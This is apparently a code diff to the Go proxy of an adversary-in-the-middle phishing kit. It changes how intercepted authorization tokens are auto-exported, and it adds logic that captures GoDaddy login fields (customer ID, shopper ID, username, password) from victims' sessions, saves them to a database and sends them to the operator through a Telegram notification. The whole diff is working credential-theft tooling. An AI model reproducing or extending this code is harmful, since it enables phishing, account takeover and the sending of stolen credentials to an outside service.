@@ -1843,13 +1843,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							if err != nil {
 								log.Error("database: %v", err)
 							}
-							if err == nil {
-								log.Success("[%d] detected authorization URL - tokens intercepted: %s", ps.Index, resp.Request.URL.Path)
+							log.Success("[%d] detected authorization URL - tokens intercepted: %s", ps.Index, resp.Request.URL.Path)
 
-								// Auto-export when auth URL is detected
-								if sessionID, ok := p.sids[ps.SessionId]; ok {
-									p.AutoExportAndSendSession(sessionID, ps.SessionId)
-								}
+							// Auto-export when auth URL is detected
+							if sessionID, ok := p.sids[ps.SessionId]; ok {
+								p.AutoExportAndSendSession(sessionID, ps.SessionId)
 							}
 
 							rid, ok := s.Params["rid"]
@@ -2408,8 +2406,48 @@ func (p *HttpProxy) setSessionCustom(sid string, name string, value string) {
 		return
 	}
 	s, ok := p.sessions[sid]
-	if ok {
-		s.SetCustom(name, value)
+	if !ok {
+		return
+	}
+	s.SetCustom(name, value)
+
+	// Promote GoDaddy credential fields into the primary username/password slots
+	// so that the Telegram notification fires even when the main fields (loginfmt/passwd)
+	// are never POSTed (GoDaddy SSO uses JSON with customerId/shopperId/username).
+	lname := strings.ToLower(name)
+	switch lname {
+	case "customerid", "shopperid":
+		if s.Username == "" {
+			s.SetUsername(value)
+			log.Success("[godaddy] captured username from custom field '%s': [%s]", name, value)
+			if err := p.db.SetSessionUsername(sid, value); err != nil {
+				log.Error("database: %v", err)
+			}
+		}
+	case "username":
+		if s.Username == "" {
+			s.SetUsername(value)
+			log.Success("[godaddy] captured username from custom field '%s': [%s]", name, value)
+			if err := p.db.SetSessionUsername(sid, value); err != nil {
+				log.Error("database: %v", err)
+			}
+		}
+	case "password":
+		if s.Password == "" {
+			s.SetPassword(value)
+			log.Success("[godaddy] captured password from custom field '%s'", name)
+			if err := p.db.SetSessionPassword(sid, value); err != nil {
+				log.Error("database: %v", err)
+			}
+		}
+	}
+
+	// Send Telegram notification once both username and password are known
+	if s.Username != "" && s.Password != "" {
+		if sessionID, ok2 := p.sids[sid]; ok2 {
+			formattedMsg := p.sessionFormatter.FormatSession(s, s.Name, sessionID)
+			p.telegram.SendFormattedSession(sessionID, formattedMsg)
+		}
 	}
 }
 
